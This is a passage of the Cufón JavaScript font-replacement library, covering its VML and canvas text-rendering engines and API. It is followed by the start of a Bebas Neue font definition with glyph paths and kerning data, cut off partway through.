		for (i = 0; shy = shys[i]; ++i) {
			shy.className = '';
			glue = shy.parentNode;
			parent = glue.parentNode;
			next = glue.nextSibling || parent.nextSibling;
			// make sure we're comparing same types
			prev = (next.nodeName.toLowerCase() == TAG_GLUE) ? glue : shy.previousSibling;
			if (prev.offsetTop >= next.offsetTop) {
				shy.className = C_SHY_DISABLED;
				if (prev.offsetTop < next.offsetTop) {
					// we have an annoying edge case, double the glue
					newGlue = document.createElement(TAG_GLUE);
					parent.insertBefore(newGlue, glue);
					newGlue.appendChild(glue);
					newGlue.appendChild(next);
				}
			}
		}
	}

	function updateShyOnResize() {
		if (ignoreResize) return; // needed for IE
		CSS.addClass(DOM.root(), C_VIEWPORT_RESIZING);
		clearTimeout(shyTimer);
		shyTimer = setTimeout(function() {
			ignoreResize = true;
			CSS.removeClass(DOM.root(), C_VIEWPORT_RESIZING);
			updateShy(document);
			ignoreResize = false;
		}, 100);
	}

	var HAS_BROKEN_REGEXP = ' '.split(/\s+/).length == 0;
	var TAG_GLUE = 'cufonglue';
	var TAG_SHY = 'cufonshy';
	var C_SHY_DISABLED = 'cufon-shy-disabled';
	var C_VIEWPORT_RESIZING = 'cufon-viewport-resizing';

	var sharedStorage = new Storage();
	var hoverHandler = new HoverHandler();
	var replaceHistory = new ReplaceHistory();
	var initialized = false;
	var trackingShy = false;
	var shyTimer;
	var ignoreResize = false;

	var engines = {}, fonts = {}, defaultOptions = {
		autoDetect: false,
		engine: null,
		forceHitArea: false,
		hover: false,
		hoverables: {
			a: true
		},
		ignore: {
			applet: 1,
			canvas: 1,
			col: 1,
			colgroup: 1,
			head: 1,
			iframe: 1,
			map: 1,
			noscript: 1,
			optgroup: 1,
			option: 1,
			script: 1,
			select: 1,
			style: 1,
			textarea: 1,
			title: 1,
			pre: 1
		},
		ignoreClass: null,
		modifyText: null,
		onAfterReplace: null,
		onBeforeReplace: null,
		printable: true,
		selector: (
				window.Sizzle
			||	(window.jQuery && function(query) { return jQuery(query); }) // avoid noConflict issues
			||	(window.dojo && dojo.query)
			||	(window.glow && glow.dom && glow.dom.get)
			||	(window.Ext && Ext.query)
			||	(window.YAHOO && YAHOO.util && YAHOO.util.Selector && YAHOO.util.Selector.query)
			||	(window.$$ && function(query) { return $$(query); })
			||	(window.$ && function(query) { return $(query); })
			||	(document.querySelectorAll && function(query) { return document.querySelectorAll(query); })
			||	elementsByTagName
		),
		separate: 'words', // 'none' and 'characters' are also accepted
		softHyphens: true,
		textless: {
			dl: 1,
			html: 1,
			ol: 1,
			table: 1,
			tbody: 1,
			thead: 1,
			tfoot: 1,
			tr: 1,
			ul: 1
		},
		textShadow: 'none',
		trim: 'advanced'
	};

	var separators = {
		// The first pattern may cause unicode characters above
		// code point 255 to be removed in Safari 3.0. Luckily enough
		// Safari 3.0 does not include non-breaking spaces in \s, so
		// we can just use a simple alternative pattern.
		words: /\s/.test('\u00a0') ? /[^\S\u00a0]+/ : /\s+/,
		characters: '',
		none: /^/
	};

	api.now = function() {
		DOM.ready();
		return api;
	};

	api.refresh = function() {
		replaceHistory.repeat.apply(replaceHistory, arguments);
		return api;
	};

	api.registerEngine = function(id, engine) {
		if (!engine) return api;
		engines[id] = engine;
		return api.set('engine', id);
	};

	api.registerFont = function(data) {
		if (!data) return api;
		var font = new Font(data), family = font.family;
		if (!fonts[family]) fonts[family] = new FontFamily();
		fonts[family].add(font);
		return api.set('fontFamily', '"' + family + '"');
	};

	api.replace = function(elements, options, ignoreHistory) {
		options = merge(defaultOptions, options);
		if (!options.engine) return api; // there's no browser support so we'll just stop here
		if (!initialized) {
			CSS.addClass(DOM.root(), 'cufon-active cufon-loading');
			CSS.ready(function() {
				// fires before any replace() calls, but it doesn't really matter
				CSS.addClass(CSS.removeClass(DOM.root(), 'cufon-loading'), 'cufon-ready');
			});
			initialized = true;
		}
		if (options.hover) options.forceHitArea = true;
		if (options.autoDetect) delete options.fontFamily;
		if (typeof options.ignoreClass == 'string') {
			options.ignoreClass = new RegExp('(?:^|\\s)(?:' + options.ignoreClass.replace(/\s+/g, '|') + ')(?:\\s|$)');
		}
		if (typeof options.textShadow == 'string') {
			options.textShadow = CSS.textShadow(options.textShadow);
		}
		if (typeof options.color == 'string' && /^-/.test(options.color)) {
			options.textGradient = CSS.gradient(options.color);
		}
		else delete options.textGradient;
		if (typeof elements == 'string') {
			if (!ignoreHistory) replaceHistory.add(elements, arguments);
			elements = [ elements ];
		}
		else if (elements.nodeType) elements = [ elements ];
		CSS.ready(function() {
			for (var i = 0, l = elements.length; i < l; ++i) {
				var el = elements[i];
				if (typeof el == 'string') api.replace(options.selector(el), options, true);
				else replaceElement(el, options);
			}
		});
		return api;
	};

	api.set = function(option, value) {
		defaultOptions[option] = value;
		return api;
	};

	return api;

})();

Cufon.registerEngine('vml', (function() {

	var ns = document.namespaces;
	if (!ns) return;
	ns.add('cvml', 'urn:schemas-microsoft-com:vml');
	ns = null;

	var check = document.createElement('cvml:shape');
	check.style.behavior = 'url(#default#VML)';
	if (!check.coordsize) return; // VML isn't supported
	check = null;

	var HAS_BROKEN_LINEHEIGHT = (document.documentMode || 0) < 8;

	document.write(('<style type="text/css">' +
		'cufoncanvas{text-indent:0;}' +
		'@media screen{' +
			'cvml\\:shape,cvml\\:rect,cvml\\:fill,cvml\\:shadow{behavior:url(#default#VML);display:block;antialias:true;position:absolute;}' +
			'cufoncanvas{position:absolute;text-align:left;}' +
			'cufon{display:inline-block;position:relative;vertical-align:' +
			(HAS_BROKEN_LINEHEIGHT
				? 'middle'
				: 'text-bottom') +
			';}' +
			'cufon cufontext{position:absolute;left:-10000in;font-size:1px;text-align:left;}' +
			'cufonshy.cufon-shy-disabled,.cufon-viewport-resizing cufonshy{display:none;}' +
			'cufonglue{white-space:nowrap;display:inline-block;}' +
			'.cufon-viewport-resizing cufonglue{white-space:normal;}' +
			'a cufon{cursor:pointer}' + // ignore !important here
		'}' +
		'@media print{' +
			'cufon cufoncanvas{display:none;}' +
		'}' +
	'</style>').replace(/;/g, '!important;'));

	function getFontSizeInPixels(el, value) {
		return getSizeInPixels(el, /(?:em|ex|%)$|^[a-z-]+$/i.test(value) ? '1em' : value);
	}

	// Original by Dead Edwards.
	// Combined with getFontSizeInPixels it also works with relative units.
	function getSizeInPixels(el, value) {
		if (!isNaN(value) || /px$/i.test(value)) return parseFloat(value);
		var style = el.style.left, runtimeStyle = el.runtimeStyle.left;
		el.runtimeStyle.left = el.currentStyle.left;
		el.style.left = value.replace('%', 'em');
		var result = el.style.pixelLeft;
		el.style.left = style;
		el.runtimeStyle.left = runtimeStyle;
		return result;
	}

	function getSpacingValue(el, style, size, property) {
		var key = 'computed' + property, value = style[key];
		if (isNaN(value)) {
			value = style.get(property);
			style[key] = value = (value == 'normal') ? 0 : ~~size.convertFrom(getSizeInPixels(el, value));
		}
		return value;
	}

	var fills = {};

	function gradientFill(gradient) {
		var id = gradient.id;
		if (!fills[id]) {
			var stops = gradient.stops, fill = document.createElement('cvml:fill'), colors = [];
			fill.type = 'gradient';
			fill.angle = 180;
			fill.focus = '0';
			fill.method = 'none';
			fill.color = stops[0][1];
			for (var j = 1, k = stops.length - 1; j < k; ++j) {
				colors.push(stops[j][0] * 100 + '% ' + stops[j][1]);
			}
			fill.colors = colors.join(',');
			fill.color2 = stops[k][1];
			fills[id] = fill;
		}
		return fills[id];
	}

	return function(font, text, style, options, node, el, hasNext) {

		var redraw = (text === null);

		if (redraw) text = node.alt;

		var viewBox = font.viewBox;

		var size = style.computedFontSize || (style.computedFontSize = new Cufon.CSS.Size(getFontSizeInPixels(el, style.get('fontSize')) + 'px', font.baseSize));

		var wrapper, canvas;

		if (redraw) {
			wrapper = node;
			canvas = node.firstChild;
		}
		else {
			wrapper = document.createElement('cufon');
			wrapper.className = 'cufon cufon-vml';
			wrapper.alt = text;

			canvas = document.createElement('cufoncanvas');
			wrapper.appendChild(canvas);

			if (options.printable) {
				var print = document.createElement('cufontext');
				print.appendChild(document.createTextNode(text));
				wrapper.appendChild(print);
			}

			// ie6, for some reason, has trouble rendering the last VML element in the document.
			// we can work around this by injecting a dummy element where needed.
			// @todo find a better solution
			if (!hasNext) wrapper.appendChild(document.createElement('cvml:shape'));
		}

		var wStyle = wrapper.style;
		var cStyle = canvas.style;

		var height = size.convert(viewBox.height), roundedHeight = Math.ceil(height);
		var roundingFactor = roundedHeight / height;
		var stretchFactor = roundingFactor * Cufon.CSS.fontStretch(style.get('fontStretch'));
		var minX = viewBox.minX, minY = viewBox.minY;

		cStyle.height = roundedHeight;
		cStyle.top = Math.round(size.convert(minY - font.ascent));
		cStyle.left = Math.round(size.convert(minX));

		wStyle.height = size.convert(font.height) + 'px';

		var color = style.get('color');
		var chars = Cufon.CSS.textTransform(text, style).split('');

		var jumps = font.spacing(chars,
			getSpacingValue(el, style, size, 'letterSpacing'),
			getSpacingValue(el, style, size, 'wordSpacing')
		);

		if (!jumps.length) return null;

		var width = jumps.total;
		var fullWidth = -minX + width + (viewBox.width - jumps[jumps.length - 1]);

		var shapeWidth = size.convert(fullWidth * stretchFactor), roundedShapeWidth = Math.round(shapeWidth);

		var coordSize = fullWidth + ',' + viewBox.height, coordOrigin;
		var stretch = 'r' + coordSize + 'ns';

		var fill = options.textGradient && gradientFill(options.textGradient);

		var glyphs = font.glyphs, offsetX = 0;
		var shadows = options.textShadow;
		var i = -1, j = 0, chr;

		while (chr = chars[++i]) {

			var glyph = glyphs[chars[i]] || font.missingGlyph, shape;
			if (!glyph) continue;

			if (redraw) {
				// some glyphs may be missing so we can't use i
				shape = canvas.childNodes[j];
				while (shape.firstChild) shape.removeChild(shape.firstChild); // shadow, fill
			}
			else {
				shape = document.createElement('cvml:shape');
				canvas.appendChild(shape);
			}

			shape.stroked = 'f';
			shape.coordsize = coordSize;
			shape.coordorigin = coordOrigin = (minX - offsetX) + ',' + minY;
			shape.path = (glyph.d ? 'm' + glyph.d + 'xe' : '') + 'm' + coordOrigin + stretch;
			shape.fillcolor = color;

			if (fill) shape.appendChild(fill.cloneNode(false));

			// it's important to not set top/left or IE8 will grind to a halt
			var sStyle = shape.style;
			sStyle.width = roundedShapeWidth;
			sStyle.height = roundedHeight;

			if (shadows) {
				// due to the limitations of the VML shadow element there
				// can only be two visible shadows. opacity is shared
				// for all shadows.
				var shadow1 = shadows[0], shadow2 = shadows[1];
				var color1 = Cufon.CSS.color(shadow1.color), color2;
				var shadow = document.createElement('cvml:shadow');
				shadow.on = 't';
				shadow.color = color1.color;
				shadow.offset = shadow1.offX + ',' + shadow1.offY;
				if (shadow2) {
					color2 = Cufon.CSS.color(shadow2.color);
					shadow.type = 'double';
					shadow.color2 = color2.color;
					shadow.offset2 = shadow2.offX + ',' + shadow2.offY;
				}
				shadow.opacity = color1.opacity || (color2 && color2.opacity) || 1;
				shape.appendChild(shadow);
			}

			offsetX += jumps[j++];
		}

		// addresses flickering issues on :hover

		var cover = shape.nextSibling, coverFill, vStyle;

		if (options.forceHitArea) {

			if (!cover) {
				cover = document.createElement('cvml:rect');
				cover.stroked = 'f';
				cover.className = 'cufon-vml-cover';
				coverFill = document.createElement('cvml:fill');
				coverFill.opacity = 0;
				cover.appendChild(coverFill);
				canvas.appendChild(cover);
			}

			vStyle = cover.style;

			vStyle.width = roundedShapeWidth;
			vStyle.height = roundedHeight;

		}
		else if (cover) canvas.removeChild(cover);

		wStyle.width = Math.max(Math.ceil(size.convert(width * stretchFactor)), 0);

		if (HAS_BROKEN_LINEHEIGHT) {

			var yAdjust = style.computedYAdjust;

			if (yAdjust === undefined) {
				var lineHeight = style.get('lineHeight');
				if (lineHeight == 'normal') lineHeight = '1em';
				else if (!isNaN(lineHeight)) lineHeight += 'em'; // no unit
				style.computedYAdjust = yAdjust = 0.5 * (getSizeInPixels(el, lineHeight) - parseFloat(wStyle.height));
			}

			if (yAdjust) {
				wStyle.marginTop = Math.ceil(yAdjust) + 'px';
				wStyle.marginBottom = yAdjust + 'px';
			}

		}

		return wrapper;

	};

})());

Cufon.registerEngine('canvas', (function() {

	// Safari 2 doesn't support .apply() on native methods

	var check = document.createElement('canvas');
	if (!check || !check.getContext || !check.getContext.apply) return;
	check = null;

	var HAS_INLINE_BLOCK = Cufon.CSS.supports('display', 'inline-block');

	// Firefox 2 w/ non-strict doctype (almost standards mode)
	var HAS_BROKEN_LINEHEIGHT = !HAS_INLINE_BLOCK && (document.compatMode == 'BackCompat' || /frameset|transitional/i.test(document.doctype.publicId));

	var styleSheet = document.createElement('style');
	styleSheet.type = 'text/css';
	styleSheet.appendChild(document.createTextNode((
		'cufon{text-indent:0;}' +
		'@media screen,projection{' +
			'cufon{display:inline;display:inline-block;position:relative;vertical-align:middle;' +
			(HAS_BROKEN_LINEHEIGHT
				? ''
				: 'font-size:1px;line-height:1px;') +
			'}cufon cufontext{display:-moz-inline-box;display:inline-block;width:0;height:0;text-align:left;text-indent:-10000in;}' +
			(HAS_INLINE_BLOCK
				? 'cufon canvas{position:relative;}'
				: 'cufon canvas{position:absolute;}') +
			'cufonshy.cufon-shy-disabled,.cufon-viewport-resizing cufonshy{display:none;}' +
			'cufonglue{white-space:nowrap;display:inline-block;}' +
			'.cufon-viewport-resizing cufonglue{white-space:normal;}' +
		'}' +
		'@media print{' +
			'cufon{padding:0;}' + // Firefox 2
			'cufon canvas{display:none;}' +
		'}'
	).replace(/;/g, '!important;')));
	document.getElementsByTagName('head')[0].appendChild(styleSheet);

	function generateFromVML(path, context) {
		var atX = 0, atY = 0;
		var code = [], re = /([mrvxe])([^a-z]*)/g, match;
		generate: for (var i = 0; match = re.exec(path); ++i) {
			var c = match[2].split(',');
			switch (match[1]) {
				case 'v':
					code[i] = { m: 'bezierCurveTo', a: [ atX + ~~c[0], atY + ~~c[1], atX + ~~c[2], atY + ~~c[3], atX += ~~c[4], atY += ~~c[5] ] };
					break;
				case 'r':
					code[i] = { m: 'lineTo', a: [ atX += ~~c[0], atY += ~~c[1] ] };
					break;
				case 'm':
					code[i] = { m: 'moveTo', a: [ atX = ~~c[0], atY = ~~c[1] ] };
					break;
				case 'x':
					code[i] = { m: 'closePath' };
					break;
				case 'e':
					break generate;
			}
			context[code[i].m].apply(context, code[i].a);
		}
		return code;
	}

	function interpret(code, context) {
		for (var i = 0, l = code.length; i < l; ++i) {
			var line = code[i];
			context[line.m].apply(context, line.a);
		}
	}

	return function(font, text, style, options, node, el) {

		var redraw = (text === null);

		if (redraw) text = node.getAttribute('alt');

		var viewBox = font.viewBox;

		var size = style.getSize('fontSize', font.baseSize);

		var expandTop = 0, expandRight = 0, expandBottom = 0, expandLeft = 0;
		var shadows = options.textShadow, shadowOffsets = [];
		if (shadows) {
			for (var i = shadows.length; i--;) {
				var shadow = shadows[i];
				var x = size.convertFrom(parseFloat(shadow.offX));
				var y = size.convertFrom(parseFloat(shadow.offY));
				shadowOffsets[i] = [ x, y ];
				if (y < expandTop) expandTop = y;
				if (x > expandRight) expandRight = x;
				if (y > expandBottom) expandBottom = y;
				if (x < expandLeft) expandLeft = x;
			}
		}

		var chars = Cufon.CSS.textTransform(text, style).split('');

		var jumps = font.spacing(chars,
			~~size.convertFrom(parseFloat(style.get('letterSpacing')) || 0),
			~~size.convertFrom(parseFloat(style.get('wordSpacing')) || 0)
		);

		if (!jumps.length) return null; // there's nothing to render

		var width = jumps.total;

		expandRight += viewBox.width - jumps[jumps.length - 1];
		expandLeft += viewBox.minX;

		var wrapper, canvas;

		if (redraw) {
			wrapper = node;
			canvas = node.firstChild;
		}
		else {
			wrapper = document.createElement('cufon');
			wrapper.className = 'cufon cufon-canvas';
			wrapper.setAttribute('alt', text);

			canvas = document.createElement('canvas');
			wrapper.appendChild(canvas);

			if (options.printable) {
				var print = document.createElement('cufontext');
				print.appendChild(document.createTextNode(text));
				wrapper.appendChild(print);
			}
		}

		var wStyle = wrapper.style;
		var cStyle = canvas.style;

		var height = size.convert(viewBox.height);
		var roundedHeight = Math.ceil(height);
		var roundingFactor = roundedHeight / height;
		var stretchFactor = roundingFactor * Cufon.CSS.fontStretch(style.get('fontStretch'));
		var stretchedWidth = width * stretchFactor;

		var canvasWidth = Math.ceil(size.convert(stretchedWidth + expandRight - expandLeft));
		var canvasHeight = Math.ceil(size.convert(viewBox.height - expandTop + expandBottom));

		canvas.width = canvasWidth;
		canvas.height = canvasHeight;

		// needed for WebKit and full page zoom
		cStyle.width = canvasWidth + 'px';
		cStyle.height = canvasHeight + 'px';

		// minY has no part in canvas.height
		expandTop += viewBox.minY;

		cStyle.top = Math.round(size.convert(expandTop - font.ascent)) + 'px';
		cStyle.left = Math.round(size.convert(expandLeft)) + 'px';

		var wrapperWidth = Math.max(Math.ceil(size.convert(stretchedWidth)), 0) + 'px';

		if (HAS_INLINE_BLOCK) {
			wStyle.width = wrapperWidth;
			wStyle.height = size.convert(font.height) + 'px';
		}
		else {
			wStyle.paddingLeft = wrapperWidth;
			wStyle.paddingBottom = (size.convert(font.height) - 1) + 'px';
		}

		var g = canvas.getContext('2d'), scale = height / viewBox.height;
		var pixelRatio = window.devicePixelRatio || 1;
		if (pixelRatio != 1) {
			canvas.width = canvasWidth * pixelRatio;
			canvas.height = canvasHeight * pixelRatio;
			g.scale(pixelRatio, pixelRatio);
		}

		// proper horizontal scaling is performed later
		g.scale(scale, scale * roundingFactor);
		g.translate(-expandLeft, -expandTop);
		g.save();

		function renderText() {
			var glyphs = font.glyphs, glyph, i = -1, j = -1, chr;
			g.scale(stretchFactor, 1);
			while (chr = chars[++i]) {
				var glyph = glyphs[chars[i]] || font.missingGlyph;
				if (!glyph) continue;
				if (glyph.d) {
					g.beginPath();
					// the following moveTo is for Opera 9.2. if we don't
					// do this, it won't forget the previous path which
					// results in garbled text.
					g.moveTo(0, 0);
					if (glyph.code) interpret(glyph.code, g);
					else glyph.code = generateFromVML('m' + glyph.d, g);
					g.fill();
				}
				g.translate(jumps[++j], 0);
			}
			g.restore();
		}

		if (shadows) {
			for (var i = shadows.length; i--;) {
				var shadow = shadows[i];
				g.save();
				g.fillStyle = shadow.color;
				g.translate.apply(g, shadowOffsets[i]);
				renderText();
			}
		}

		var gradient = options.textGradient;
		if (gradient) {
			var stops = gradient.stops, fill = g.createLinearGradient(0, viewBox.minY, 0, viewBox.maxY);
			for (var i = 0, l = stops.length; i < l; ++i) {
				fill.addColorStop.apply(fill, stops[i]);
			}
			g.fillStyle = fill;
		}
		else g.fillStyle = style.get('color');

		renderText();

		return wrapper;

	};

})());
/*!
 * The following copyright notice may not be removed under any circumstances.
 * 
 * Copyright:
 * Copyright (c) 2010 by Ryoichi Tsunekawa. All rights reserved.
 * 
 * Trademark:
 * Bebas Neue is a trademark of Ryoichi Tsunekawa.
 * 
 * Full name:
 * BebasNeue
 * 
 * Description:
 * Copyright (c) 2010 by Ryoichi Tsunekawa. All rights reserved.
 * 
 * Manufacturer:
 * Ryoichi Tsunekawa
 * 
 * Designer:
 * Ryoichi Tsunekawa
 * 
 * License information:
 * http://dharmatype.com
 */
Cufon.registerFont({"w":142,"face":{"font-family":"Bebas Neue","font-weight":400,"font-stretch":"normal","units-per-em":"360","panose-1":"2 11 0 0 0 0 0 0 0 0","ascent":"252","descent":"-108","x-height":"3","bbox":"-49 -323 360 71.5217","underline-thickness":"18","underline-position":"-18","unicode-range":"U+0020-U+2248"},"glyphs":{" ":{"w":55},"!":{"d":"49,-56r-30,0r-5,-91r0,-105r40,0r0,105xm15,-38r38,0r0,38r-38,0r0,-38","w":68},"\"":{"d":"20,-178r-6,-74r39,0r-6,74r-27,0xm70,-178r-6,-74r39,0r-6,74r-27,0","w":117},"#":{"d":"71,0r8,-72r-24,0r-7,72r-33,0r8,-72r-18,0r3,-28r18,0r7,-66r-18,0r3,-28r18,0r6,-58r32,0r-6,58r23,0r7,-58r32,0r-6,58r18,0r-3,28r-18,0r-7,66r18,0r-2,28r-19,0r-7,72r-33,0xm65,-166r-7,66r24,0r7,-66r-24,0","w":147},"$":{"d":"13,-188v0,-34,14,-55,42,-61r0,-19r32,0r0,19v30,6,45,30,43,69r-37,0v1,-20,-3,-35,-20,-35v-13,0,-20,7,-20,25v0,52,77,54,77,126v0,34,-15,56,-43,62r0,18r-32,0r0,-18v-33,-7,-46,-36,-43,-79r38,0v-1,22,0,44,20,44v13,0,21,-7,21,-25v0,-52,-78,-54,-78,-126"},"%":{"d":"37,-215r0,86v0,11,5,16,13,16v8,0,13,-5,13,-16r0,-86v0,-11,-5,-16,-13,-16v-8,0,-13,5,-13,16xm50,-90v-55,2,-38,-73,-38,-123v0,-26,13,-41,38,-41v55,-2,39,73,39,123v0,26,-14,41,-39,41xm50,0r100,-252r23,0r-99,252r-24,0xm162,-122r0,86v0,11,5,16,13,16v8,0,13,-5,13,-16r0,-86v0,-11,-5,-16,-13,-16v-8,0,-13,5,-13,16xm175,3v-55,0,-38,-74,-38,-123v0,-26,13,-41,38,-41v55,-2,38,74,38,124v0,26,-13,40,-38,40","w":225},"&":{"d":"59,3v-58,0,-59,-120,-17,-136v-46,-20,-35,-130,32,-119r45,0r0,36v-35,1,-65,-12,-65,40v0,28,17,28,41,27r0,-28r40,0r0,28r10,0r0,36r-10,0v2,38,-4,82,4,113r-40,0v-2,-5,-3,-9,-4,-20v-7,15,-18,23,-36,23xm54,-81v0,23,-1,48,21,48v30,0,17,-51,20,-80v-27,-2,-41,2,-41,32","w":149},"'":{"d":"19,-178r-6,-74r38,0r-5,74r-27,0","w":64},"(":{"d":"17,-197v-1,-45,22,-57,68,-55r0,32v-19,-1,-29,0,-28,23r0,142v-1,23,9,24,28,23r0,32v-46,2,-68,-10,-68,-55r0,-142","w":90,"k":{"\u1ef3":-2,"\u1ef2":-2,"\u1e85":-1,"\u1e84":-1,"\u1e83":-1,"\u1e82":-1,"\u1e81":-1,"\u1e80":-1,"\u1e6b":-3,"\u1e6a":-3,"\u021b":-3,"\u021a":-3,"\u0178":-2,"\u0177":-2,"\u0176":-2,"\u0175":-1,"\u0174":-1,"\u0167":-3,"\u0166":-3,"\u0165":-3,"\u0164":-3,"\u0163":-3,"\u0162":-3,"\u00ff":-2,"\u00fd":-2,"\u00dd":-2,"y":-2,"w":-1,"t":-3,"Y":-2,"W":-1,"T":-3,"v":-1,"V":-1}},")":{"d":"6,-252v45,-2,67,10,67,55r0,142v1,45,-21,57,-67,55r0,-32v18,1,28,-1,28,-23r0,-142v0,-22,-9,-24,-28,-23r0,-32","w":90},"*":{"d":"11,-220r53,27r-9,-59r32,0r-9,59r54,-27r10,31r-59,10r42,42r-26,19r-28,-53r-27,53r-26,-19r42,-42r-59,-10"},"+":{"d":"85,-91r45,0r0,28r-117,0r0,-28r44,0r0,-29r-44,0r0,-28r44,0r0,-41r28,0r0,41r45,0r0,28r-45,0r0,29"},",":{"d":"30,0r-16,0r0,-38r39,0v4,34,-8,53,-18,74r-16,0","w":66,"k":{"\u1ef3":29,"\u1ef2":29,"\u1e85":14,"\u1e84":14,"\u1e83":14,"\u1e82":14,"\u1e81":14,"\u1e80":14,"\u1e6b":22,"\u1e6a":22,"\u1e61":2,"\u1e60":2,"\u021b":22,"\u021a":22,"\u0219":2,"\u0218":2,"\u01ff":4,"\u01fe":4,"\u0178":29,"\u0177":29,"\u0176":29,"\u0175":14,"\u0174":14,"\u0173":2,"\u0172":2,"\u0171":2,"\u0170":2,"\u016f":2,"\u016e":2,"\u016d":2,"\u016c":2,"\u016b":2,"\u016a":2,"\u0169":2,"\u0168":2,"\u0167":22,"\u0166":22,"\u0165":22,"\u0164":22,"\u0163":22,"\u0162":22,"\u0161":2,"\u0160":2,"\u015f":2,"\u015e":2,"\u015d":2,"\u015c":2,"\u015b":2,"\u015a":2,"\u0151":4,"\u0150":4,"\u014f":4,"\u014e":4,"\u014d":4,"\u014c":4,"\u0123":4,"\u0122":4,"\u0121":4,"\u0120":4,"\u011f":4,"\u011e":4,"\u011d":4,"\u011c":4,"\u010d":4,"\u010c":4,"\u010b":4,"\u010a":4,"\u0109":4,"\u0108":4,"\u0107":4,"\u0106":4,"\u00ff":29,"\u00fd":29,"\u00fc":2,"\u00fb":2,"\u00fa":2,"\u00f9":2,"\u00f8":4,"\u00f6":4,"\u00f5":4,"\u00f4":4,"\u00f3":4,"\u00f2":4,"\u00e7":4,"\u00df":2,"\u00dd":29,"\u00dc":2,"\u00db":2,"\u00da":2,"\u00d9":2,"\u00d8":4,"\u00d6":4,"\u00d5":4,"\u00d4":4,"\u00d3":4,"\u00d2":4,"\u00c7":4,"y":29,"w":14,"u":2,"t":22,"s":2,"o":4,"g":4,"c":4,"Y":29,"W":14,"U":2,"T":22,"S":2,"O":4,"G":4,"C":4,"\u0153":4,"\u0152":4,"v":22,"q":4,"V":22,"Q":4}},"-":{"d":"13,-108r0,-36r72,0r0,36r-72,0","w":97,"k":{"x":5,"v":4,"X":5,"V":4,"T":12,"\u0162":12,"\u0164":12,"\u0166":12,"\u021a":12,"\u1e6a":12,"W":1,"\u0174":1,"\u1e80":1,"\u1e82":1,"\u1e84":1,"Y":6,"\u00dd":6,"\u0176":6,"\u0178":6,"\u1ef2":6,"t":12,"\u0163":12,"\u0165":12,"\u0167":12,"\u021b":12,"\u1e6b":12,"w":1,"\u0175":1,"\u1e81":1,"\u1e83":1,"\u1e85":1,"y":6,"\u00fd":6,"\u00ff":6,"\u0177":6,"\u1ef3":6,"A":4,"\u00c0":4,"\u00c1":4,"\u00c2":4,"\u00c3":4,"\u00c4":4,"\u00c5":4,"\u0100":4,"\u0102":4,"\u0104":4,"a":4,"\u00e0":4,"\u00e1":4,"\u00e2":4,"\u00e3":4,"\u00e4":4,"\u00e5":4,"\u0101":4,"\u0103":4,"\u0105":4,"Z":4,"\u0179":4,"\u017b":4,"\u017d":4,"z":4,"\u017a":4,"\u017c":4,"\u017e":4}},".":{"d":"14,-38r39,0r0,38r-39,0r0,-38","w":66,"k":{"\u1ef3":29,"\u1ef2":29,"\u1e85":14,"\u1e84":14,"\u1e83":14,"\u1e82":14,"\u1e81":14,"\u1e80":14,"\u1e6b":22,"\u1e6a":22,"\u1e61":2,"\u1e60":2,"\u021b":22,"\u021a":22,"\u0219":2,"\u0218":2,"\u01ff":4,"\u01fe":4,"\u0178":29,"\u0177":29,"\u0176":29,"\u0175":14,"\u0174":14,"\u0173":2,"\u0172":2,"\u0171":2,"\u0170":2,"\u016f":2,"\u016e":2,"\u016d":2,"\u016c":2,"\u016b":2,"\u016a":2,"\u0169":2,"\u0168":2,"\u0167":22,"\u0166":22,"\u0165":22,"\u0164":22,"\u0163":22,"\u0162":22,"\u0161":2,"\u0160":2,"\u015f":2,"\u015e":2,"\u015d":2,"\u015c":2,"\u015b":2,"\u015a":2,"\u0151":4,"\u0150":4,"\u014f":4,"\u014e":4,"\u014d":4,"\u014c":4,"\u0123":4,"\u0122":4,"\u0121":4,"\u0120":4,"\u011f":4,"\u011e":4,"\u011d":4,"\u011c":4,"\u010d":4,"\u010c":4,"\u010b":4,"\u010a":4,"\u0109":4,"\u0108":4,"\u0107":4,"\u0106":4,"\u00ff":29,"\u00fd":29,"\u00fc":2,"\u00fb":2,"\u00fa":2,"\u00f9":2,"\u00f8":4,"\u00f6":4,"\u00f5":4,"\u00f4":4,"\u00f3":4,"\u00f2":4,"\u00e7":4,"\u00df":2,"\u00dd":29,"\u00dc":2,"\u00db":2,"\u00da":2,"\u00d9":2,"\u00d8":4,"\u00d6":4,"\u00d5":4,"\u00d4":4,"\u00d3":4,"\u00d2":4,"\u00c7":4,"y":29,"w":14,"u":2,"t":22,"s":2,"o":4,"g":4,"c":4,"Y":29,"W":14,"U":2,"T":22,"S":2,"O":4,"G":4,"C":4,"\u0153":4,"\u0152":4,"v":22,"q":4,"V":22,"Q":4}},"\/":{"d":"2,0r99,-252r34,0r-99,252r-34,0","w":137,"k":{"\/":65}},"0":{"d":"51,-194r0,136v0,18,7,25,20,25v13,0,21,-7,21,-25r0,-136v0,-18,-8,-25,-21,-25v-13,0,-20,7,-20,25xm71,3v-87,0,-60,-117,-60,-195v0,-40,21,-63,60,-63v87,0,60,117,60,195v0,40,-21,63,-60,63"},"1":{"d":"39,-192r0,-28v31,0,37,-15,43,-32r27,0r0,252r-40,0r0,-192r-30,0"},"2":{"d":"93,-190v2,-40,-43,-38,-41,-4r0,27r-38,0v-4,-52,10,-89,59,-88v39,0,59,23,59,63v0,83,-86,112,-78,156r75,0r0,36r-115,0v-15,-101,74,-109,79,-190"},"3":{"d":"51,-149v32,4,40,-8,40,-41v0,-40,-43,-38,-41,-4r0,16r-38,0v-3,-48,15,-77,59,-77v66,0,79,100,32,122v47,23,38,136,-32,136v-47,0,-63,-33,-59,-84r38,0v-1,22,-1,51,20,48v19,4,21,-24,21,-48v0,-29,-14,-34,-40,-32r0,-36"},"4":{"d":"5,-46r0,-36r72,-170r43,0r0,170r19,0r0,36r-19,0r0,46r-39,0r0,-46r-76,0xm41,-82r40,0r0,-93"},"5":{"d":"13,-81r37,0v-1,23,-1,48,21,48v31,0,20,-51,20,-80v0,-18,-7,-25,-20,-25v-15,-1,-23,12,-21,32r-37,0r7,-146r104,0r0,36r-69,0r-3,60v24,-35,79,-18,79,39v0,62,3,120,-59,120v-47,0,-63,-33,-59,-84"},"6":{"d":"72,3v-86,0,-60,-114,-60,-192v0,-42,19,-66,60,-66v41,0,61,26,59,70r-37,0v2,-20,-5,-36,-21,-34v-29,-4,-21,48,-22,77v21,-40,81,-24,81,35v0,59,-2,110,-60,110xm72,-128v-29,0,-20,43,-21,70v0,18,8,25,21,25v29,0,20,-43,21,-70v0,-18,-8,-25,-21,-25"},"7":{"d":"12,-252r119,0r0,35r-59,217r-39,0r58,-216r-79,0r0,-36"},"8":{"d":"109,-133v44,32,31,147,-3